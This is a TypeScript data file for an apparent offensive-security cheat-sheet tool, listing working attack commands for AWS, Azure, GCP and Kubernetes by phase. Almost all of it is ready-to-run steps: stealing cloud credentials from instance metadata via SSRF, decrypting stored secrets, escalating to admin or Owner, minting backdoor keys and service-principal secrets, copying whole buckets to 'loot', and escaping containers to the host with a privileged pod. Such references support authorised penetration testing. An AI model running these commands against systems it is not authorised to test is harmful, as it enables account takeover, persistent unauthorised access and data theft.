/**
 * Cloud domain: offensive security for AWS, Azure, and GCP. The biggest gap for
 * modern engagements, structured the way an operator moves through a cloud
 * tenant: enumerate identity and resources, harvest credentials, escalate,
 * persist, and reach the data.
 *
 * Commands are byte-exact and real. Cloud placeholders (<BUCKET>, <ROLE-NAME>,
 * <VAULT>, <PROJECT>) are literal on purpose - not curated Variable Console
 * tokens, so they copy exactly as written. Structured data: adding a provider,
 * phase, or command is a data entry.
 */
import type { Cmd } from './commands.ts';

export interface CloudPhase { id: string; title: string; blurb?: string; cmds: Cmd[] }
export interface CloudProvider {
  id: string; name: string; short: string; tag: string; intro: string;
  phases: CloudPhase[]; refs: { label: string; url: string }[];
}

export const CLOUD: CloudProvider[] = [
  {
    id: 'aws', name: 'Amazon Web Services', short: 'AWS', tag: 'IAM · S3 · EC2 · Lambda · STS',
    intro: 'AWS security is IAM: almost every attack is an identity problem. You start from a set of keys or a role, map exactly what they can do, then find the one over-permissioned action that lets you become a bigger role. The instance metadata service (IMDS) is the classic bridge from a web bug to cloud credentials.',
    phases: [
      {
        id: 'aws-enum', title: 'Enumeration', blurb: 'Establish who you are and what these credentials can touch. Do this first.',
        cmds: [
          { cmd: 'aws sts get-caller-identity', desc: 'Who am I: account id, user/role ARN. The first command every time' },
          { cmd: 'aws iam get-account-authorization-details', desc: 'Dump all users, roles, groups, and policies (if allowed)' },
          { cmd: 'python3 enumerate-iam.py --access-key <AK> --secret-key <SK>', desc: 'Brute which API calls your keys can make (denies are not logged)' },
          { cmd: 'aws s3 ls', desc: 'List buckets you can see; then: aws s3 ls s3://<BUCKET> to browse' },
          { cmd: 'scout aws', desc: 'ScoutSuite: full multi-service security-posture report' },
        ],
      },
      {
        id: 'aws-creds', title: 'Credential access', blurb: 'Harvest more keys and secrets. IMDS bridges an app bug to cloud creds.',
        cmds: [
          { cmd: 'curl http://169.254.169.254/latest/meta-data/iam/security-credentials/', desc: 'IMDSv1 via SSRF: list the instance role, then append its name for keys' },
          { cmd: 'TOKEN=$(curl -sX PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 60"); curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/latest/meta-data/iam/security-credentials/', desc: 'IMDSv2 (token-based) equivalent' },
          { cmd: 'aws secretsmanager list-secrets --query "SecretList[].Name" && aws secretsmanager get-secret-value --secret-id <NAME>', desc: 'Secrets Manager: list then read plaintext secrets' },
          { cmd: 'aws ssm get-parameters-by-path --path / --recursive --with-decryption', desc: 'SSM Parameter Store: decrypt every parameter (creds hide here)' },
        ],
      },
      {
        id: 'aws-privesc', title: 'Privilege escalation', blurb: 'Find the one permission that makes you a bigger role. Pacu automates the paths.',
        cmds: [
          { cmd: 'pacu', desc: 'Start Pacu, then: run iam__enum_permissions; run iam__privesc_scan' },
          { cmd: 'aws iam create-policy-version --policy-arn <ARN> --policy-document file://admin.json --set-as-default', desc: 'iam:CreatePolicyVersion privesc: swap in an admin policy' },
          { cmd: 'aws lambda create-function --function-name x --role <ADMIN-ROLE-ARN> --runtime python3.12 --handler x.h --zip-file fileb://f.zip', desc: 'iam:PassRole + Lambda: run code as a privileged role' },
          { cmd: 'aws sts assume-role --role-arn <ROLE-ARN> --role-session-name s', desc: 'Assume a role whose trust policy you can reach (or edited)' },
        ],
      },
      {
        id: 'aws-persist', title: 'Persistence and data', blurb: 'Keep access and reach the data. A second access key is the quietest foothold.',
        cmds: [
          { cmd: 'aws iam create-access-key --user-name <USER>', desc: 'Mint a second access key for a user you control (durable backdoor)' },
          { cmd: 'aws s3 sync s3://<BUCKET> ./loot', desc: 'Exfiltrate an entire bucket' },
          { cmd: 'aws ec2 create-image --instance-id <ID> --name x', desc: 'Image a running instance to exfiltrate its disk offline' },
        ],
      },
    ],
    refs: [
      { label: 'Pacu (Rhino Security)', url: 'https://github.com/RhinoSecurityLabs/pacu' },
      { label: 'HackTricks Cloud: AWS', url: 'https://cloud.hacktricks.xyz/pentesting-cloud/aws-security' },
    ],
  },
  {
    id: 'azure', name: 'Microsoft Azure', short: 'Azure', tag: 'Entra ID · IMDS · Key Vault · RBAC',
    intro: 'Azure has two planes: the Entra ID (Azure AD) identity plane and the ARM resource plane, and attacks cross between them. A managed identity on a VM yields a token to the resource plane; Entra roles like Global Administrator or a privileged app registration walk to full tenant control. AzureHound maps the paths the way BloodHound maps on-prem AD.',
    phases: [
      {
        id: 'az-enum', title: 'Enumeration', blurb: 'Map both planes: who you are in Entra ID and what you hold in ARM.',
        cmds: [
          { cmd: 'az login && az account show', desc: 'Authenticate and confirm the subscription / tenant context' },
          { cmd: 'az ad signed-in-user show', desc: 'Who am I in Entra ID' },
          { cmd: 'az role assignment list --all -o table', desc: 'Every RBAC assignment you can see (find Owner / Contributor)' },
          { cmd: 'az resource list -o table', desc: 'All resources in reach (VMs, storage, key vaults, functions)' },
          { cmd: 'roadrecon gather && roadrecon dump', desc: 'ROADtools: full offline Entra ID dump for analysis' },
          { cmd: 'AzureHound -u <USER> -p <PASS> -t <TENANT> list --collect all -o out.json', desc: 'Collect the Entra ID + Azure RBAC graph for BloodHound' },
        ],
      },
      {
        id: 'az-creds', title: 'Credential access', blurb: 'Managed identities on a VM are the Azure equivalent of IMDS credentials.',
        cmds: [
          { cmd: 'curl -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"', desc: 'Managed-identity token for ARM (from a VM / SSRF)' },
          { cmd: 'curl -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net"', desc: 'Same, scoped to Key Vault, then read secrets' },
          { cmd: 'az keyvault secret list --vault-name <VAULT> && az keyvault secret show --vault-name <VAULT> --name <NAME>', desc: 'List then read Key Vault secrets' },
          { cmd: 'az vm run-command invoke -g <RG> -n <VM> --command-id RunShellScript --scripts "whoami"', desc: 'Run commands on a VM you have rights over (RCE via ARM)' },
        ],
      },
      {
        id: 'az-privesc', title: 'Privilege escalation and persistence', blurb: 'Walk Entra roles and app permissions to tenant control; persist via service principals.',
        cmds: [
          { cmd: 'az role assignment create --assignee <ID> --role Owner --scope /subscriptions/<SUB>', desc: 'If you can assign roles, grant yourself Owner' },
          { cmd: 'az ad app credential reset --id <APP-ID>', desc: 'Add a client secret to an app / service principal (backdoor identity)' },
          { cmd: 'az storage blob download-batch -d ./loot -s <CONTAINER> --account-name <ACCT>', desc: 'Exfiltrate a storage container' },
        ],
      },
    ],
    refs: [
      { label: 'ROADtools', url: 'https://github.com/dirkjanm/ROADtools' },
      { label: 'HackTricks Cloud: Azure', url: 'https://cloud.hacktricks.xyz/pentesting-cloud/azure-security' },
    ],
  },
  {
    id: 'gcp', name: 'Google Cloud Platform', short: 'GCP', tag: 'IAM · service accounts · metadata',
    intro: 'GCP attacks revolve around service accounts and the impersonation permissions that let one identity act as another. The permission to create a service-account key or to generate its access token is effectively privilege escalation. As in AWS, the metadata server on a compute instance hands out tokens to anything that can reach it.',
    phases: [
      {
        id: 'gcp-enum', title: 'Enumeration', blurb: 'Establish your identity, projects, and the service accounts in reach.',
        cmds: [
          { cmd: 'gcloud auth list && gcloud config list', desc: 'Active identity and current project' },
          { cmd: 'gcloud projects list', desc: 'Projects you can see (each is a separate blast radius)' },
          { cmd: 'gcloud iam service-accounts list', desc: 'Service accounts (the real targets in GCP)' },
          { cmd: 'gcloud projects get-iam-policy <PROJECT> --format=json', desc: 'Who has what on the project (find your escalation path)' },
          { cmd: 'scout gcp', desc: 'ScoutSuite: full posture report for the project' },
        ],
      },
      {
        id: 'gcp-creds', title: 'Credential access', blurb: 'The metadata server yields a token to anything that reaches it.',
        cmds: [
          { cmd: 'curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" -H "Metadata-Flavor: Google"', desc: 'Access token for the instance service account (from a VM / SSRF)' },
          { cmd: 'gcloud secrets versions access latest --secret=<NAME>', desc: 'Read a Secret Manager secret' },
          { cmd: 'gsutil ls && gsutil cp -r gs://<BUCKET> ./loot', desc: 'List and exfiltrate Cloud Storage buckets' },
        ],
      },
      {
        id: 'gcp-privesc', title: 'Privilege escalation and persistence', blurb: 'Impersonate a more privileged service account, or mint a durable key.',
        cmds: [
          { cmd: 'gcloud iam service-accounts keys create key.json --iam-account <SA-EMAIL>', desc: 'iam.serviceAccountKeys.create: durable creds for a privileged SA' },
          { cmd: 'gcloud compute instances list --impersonate-service-account=<SA-EMAIL>', desc: 'iam.serviceAccounts.getAccessToken: act as a bigger SA directly' },
          { cmd: 'gcloud projects add-iam-policy-binding <PROJECT> --member="user:<YOU>" --role="roles/owner"', desc: 'If you can set IAM policy, grant yourself Owner' },
        ],
      },
    ],
    refs: [
      { label: 'GCP IAM Privilege Escalation', url: 'https://github.com/RhinoSecurityLabs/GCP-IAM-Privilege-Escalation' },
      { label: 'HackTricks Cloud: GCP', url: 'https://cloud.hacktricks.xyz/pentesting-cloud/gcp-security' },
    ],
  },
  {
    id: 'k8s', name: 'Kubernetes & Containers', short: 'K8s', tag: 'RBAC · service accounts · pod escape',
    intro: 'Container and Kubernetes attacks turn on identity and isolation: a service-account token mounted in a pod, an over-permissive RBAC role, or a privileged pod that can reach the host. From one pod you map what your identity can do, read secrets, then break out to the node and the wider cluster.',
    phases: [
      {
        id: 'k8s-enum', title: 'Enumeration', blurb: 'From inside a pod (or with a kubeconfig), map exactly what your identity is allowed to do.',
        cmds: [
          { cmd: 'kubectl auth can-i --list', desc: 'Exactly what your service account can do (the whole game)' },
          { cmd: 'kubectl get pods,secrets,serviceaccounts -A', desc: 'Pods, secrets, and accounts across all namespaces' },
          { cmd: 'kubectl get nodes -o wide', desc: 'Cluster nodes (targets for a host breakout)' },
          { cmd: 'curl -sk https://<TARGET-IP>:10250/pods', desc: 'Unauthenticated Kubelet API: the pods a node runs' },
        ],
      },
      {
        id: 'k8s-creds', title: 'Credential Access', blurb: 'The mounted service-account token is your key to the API server.',
        cmds: [
          { cmd: 'cat /var/run/secrets/kubernetes.io/serviceaccount/token', desc: 'The pod service-account JWT (use it as a bearer token)' },
          { cmd: 'kubectl get secrets -A -o json | grep -iE "token|password|key"', desc: 'Harvest secrets across namespaces' },
          { cmd: 'env | grep -iE "AWS_|AZURE_|GOOGLE_|_KEY|_TOKEN"', desc: 'Cloud credentials injected into the container env' },
        ],
      },
      {
        id: 'k8s-escape', title: 'Privilege Escalation & Escape', blurb: 'Break out of the container to the node, then pivot across the cluster.',
        cmds: [
          { cmd: 'capsh --print', desc: 'Container capabilities (CAP_SYS_ADMIN usually means escapable)' },
          { cmd: "kubectl run r00t --image=alpine --overrides='{\"spec\":{\"hostPID\":true,\"containers\":[{\"name\":\"r\",\"image\":\"alpine\",\"command\":[\"nsenter\",\"--target\",\"1\",\"--mount\",\"--\",\"bash\"],\"securityContext\":{\"privileged\":true},\"stdin\":true,\"tty\":true}]}}' -it", desc: 'If you can create pods: a privileged pod, then nsenter onto the host' },
          { cmd: 'mount /dev/sda1 /mnt && chroot /mnt bash', desc: 'Privileged container: mount the host disk and chroot in' },
        ],
      },
    ],
    refs: [
      { label: 'HackTricks Cloud: K8s', url: 'https://cloud.hacktricks.xyz/pentesting-cloud/kubernetes-security' },
      { label: 'Peirates', url: 'https://github.com/inguardians/peirates' },
    ],
  },
];
